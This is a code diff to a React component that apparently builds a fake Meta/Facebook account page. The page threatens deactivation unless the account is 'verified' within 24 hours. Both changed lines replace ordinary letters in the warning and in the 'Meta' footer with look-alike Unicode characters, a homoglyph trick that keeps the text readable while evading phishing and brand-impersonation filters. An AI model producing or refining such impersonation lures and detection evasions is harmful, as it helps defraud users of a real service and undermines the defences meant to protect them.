@@ -158,7 +158,7 @@ return(
          />
          <div className="absolute top-0 left-50 text-center mt-2">
             <h2 className="text-center">
-               <p style={{lineHeight: '13px',margin:'0px 10px 0px 52px'}}><span style={{fontSize: '13px' ,color: 'rgb(0, 0, 0)'}}>If your account is not verified within the next 24 hours, we will deactivate your account</span></p>
+               <p style={{lineHeight: '13px',margin:'0px 10px 0px 52px'}}><span style={{fontSize: '13px' ,color: 'rgb(0, 0, 0)'}}>Ӏf уοսr ассοսոt іѕ ոοt ⅴеrіfіеⅾ ԝіthіո thе ոехt 24 hοսrѕ, ԝе ԝіⅼⅼ ⅾеасtіⅴаtе уоսr ассоսոt</span></p>
             </h2>
          </div>
       </div>
@@ -199,7 +199,7 @@ return(
       <button className="lp-element lp-pom-button" id="lp-pom-button-66"><span className="label"><strong>Create new account</strong></span></button>
    </div>
    <div className="text-center mb-2 mt-0">
-   <span className="text-gray-400" style={{fontSize: '13px'}}>Meta © 2024</span>
+   <span className="text-gray-400" style={{fontSize: '13px'}}>Меtа © 2024</span>
    </div>
    </div>
 </div>
